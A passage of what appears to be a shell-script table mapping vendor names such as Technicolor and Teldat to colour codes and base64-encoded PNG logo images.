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'
										["Technicolor"]='#FFFFFF ##E6E6E6 #696969 data:image/png;base64,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'
										["Teldat"]='#599BD7 #2F2145 #D6D6D6 data:image/png;base64,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